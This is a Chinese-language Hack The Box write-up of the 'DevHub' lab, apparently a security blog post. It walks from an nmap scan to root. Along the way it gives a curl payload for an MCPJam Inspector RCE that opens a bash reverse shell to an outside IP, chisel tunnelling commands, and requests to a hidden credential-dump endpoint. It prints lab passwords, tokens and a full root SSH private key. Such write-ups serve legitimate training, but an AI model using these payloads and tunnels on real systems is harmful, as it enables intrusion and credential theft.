---
title: HTB DevHub 靶场 Writeup
date: 2026-08-24 20:10:00
categories:
  - 靶场
tags:
  - HTB
  - DevHub
  - 靶场
description: HTB DevHub 靶场 Writeup
---

浏览器访问ip->域名devhub.htb

域名写入主机：

```plain
10.129.245.216 devhub.htb
```

#### nmap
```plain
┌──(echoin㉿kali)-[~]
└─$ nmap -sC -sV 10.129.245.216 -A              
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-30 14:59 CST
Nmap scan report for 10.129.245.216
Host is up (0.46s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (88%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.15 (90%), Linux 4.19 (90%), OpenWrt 21.02 (Linux 5.4) (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   539.68 ms 10.10.16.1
2   539.83 ms 10.129.245.216

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.88 seconds

```

端口：22,80,扫全端口发现6274

[http://devhub.htb/](http://devhub.htb/)：
![](/img/htb/htb-devhub-001.png)

[http://devhub.htb:6274](http://devhub.htb:6274)：

**<font style="color:rgb(0, 0, 0);">MCPJam Inspector</font>**
![](/img/htb/htb-devhub-002.png)

#### 找相关漏洞
MCPJam Inspector远程代码执行漏洞(CVE-2026-23744)

MCPJam 检测器是 MCP 服务器的本地首发开发平台，由于MCPJam检测器默认监听0.0.0.0而不是127.0.0.1,攻击者可以通过简单的HTTP请求远程触发RCE

payload：

```plain
curl -X POST http://devhub.htb:6274/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverConfig":{
    "command":"bash",
    "args":["-c","bash -i >& /dev/tcp/10.10.17.254/4444 0>&1"],
    "env":{}
  },
  "serverId":"111"
}'

![](/img/htb/htb-devhub-003.png)
```

拿到shell，是mcp-devyonghu ，没有flag，也没权限

#### 查看进程
<font style="background-color:#FBDE28;">ps aux</font>
![](/img/htb/htb-devhub-004.png)

发现一个jupyter

#### 挂代理
(80端口的页面提示有8888端口）

```plain
./chisel client -v 10.10.17.254:1234 R:0.0.0.0:8888:0.0.0.0:8888
```

kali：

```plain
./chisel server --reverse -v -p 1234 --socks5
```

 把靶机本机的 8888 端口，映射暴露到 kali 机器的 8888 端口


![](/img/htb/htb-devhub-005.png)

访问8888端口，发现可用token登录

a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7


![](/img/htb/htb-devhub-006.png)

打开终端，拿到analyst用户


![](/img/htb/htb-devhub-007.png)

user flag:  ce3f11b07bf0a71d69ba8e0ab7e0f2bf

#### 信息收集

![](/img/htb/htb-devhub-008.png)

笔记内容

```plain
2025年第四季度分析报告
DevHub指标的内部数据分析

import pandas as pd
import numpy as np
# Load internal metrics
# data = pd.read_csv('/data/metrics.csv')
```

没用

查看：/opt/opsmcp/server.py

```plain
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
    
    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })
    
    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })
    
    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })
    
    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })
    
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })
    
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
    
    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

#### 分析源码

![](/img/htb/htb-devhub-009.png)

拿到3个密码，2个token


![](/img/htb/htb-devhub-010.png)

 请求头必须携带：`X‑API‑Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a`，否则全部接口返回 401 未授权


![](/img/htb/htb-devhub-011.png)

这个ops._admin_dump可以获取凭证，confirm得是ture

kali 发送 POST 请求拿到密码

```plain
curl -X POST http://127.0.0.1:8888/tools/call \
-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
-H "Content-Type: application/json" \
-d '{"name":"ops._admin_dump","arguments":{"target":"passwords","confirm":true}}'
```

就能拿到密码


![](/img/htb/htb-devhub-012.png)

但是端口是5000

所以重新挂代理，转发5000端口

```plain
./chisel client -v 10.10.17.254:1234 R:0.0.0.0:5000:0.0.0.0:5000
```

```plain
curl -X POST http://127.0.0.1:5000/tools/call \
-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
-H "Content-Type: application/json" \
-d '{"name":"ops._admin_dump","arguments":{"target":"passwords","confirm":true}}'
```


![](/img/htb/htb-devhub-013.png)

但是之前测试过，root密码不对

又因为有22端口，所以那id_rsa，用ssh密钥登录

```plain
curl -X POST http://127.0.0.1:5000/tools/call \
-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
-H "Content-Type: application/json" \
-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```


![](/img/htb/htb-devhub-014.png)

```plain
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n
Ghm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ
7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W
v9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu
ITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs
gyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s
qKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa
V3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS
0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6
JtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8
HUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB
dcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L
Cvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2
nkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn
Mz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK
MtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI
oocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk
Jt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ
nI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr
C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
-----END OPENSSH PRIVATE KEY-----
```

<font style="color:rgb(77, 77, 77);">还原id_rsa，使用</font>密钥<font style="color:rgb(77, 77, 77);">登录系统</font>

```plain
chmod 600 root_id_rsa
ssh root@10.129.245.216 -i root_id_rsa
```


![](/img/htb/htb-devhub-015.png)



![](/img/htb/htb-devhub-016.png)

root flag：8bfdca3d0dc8aff22b2be7e9fc9b7673


![](/img/htb/htb-devhub-017.png)

